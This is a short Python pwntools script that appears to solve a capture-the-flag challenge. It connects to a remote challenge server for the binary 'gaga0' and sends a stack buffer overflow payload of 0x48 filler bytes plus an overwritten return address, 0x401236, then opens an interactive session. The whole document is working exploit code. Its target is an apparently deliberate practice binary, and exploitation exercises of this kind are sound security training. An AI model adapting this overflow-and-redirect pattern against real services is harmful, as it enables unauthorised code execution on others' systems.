from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./gaga0')

p = remote('challs.actf.co', '31300')

payload = b'a' * 0x48 + p64(0x00401236)
p.sendlineafter(b'input: ', payload)

p.interactive()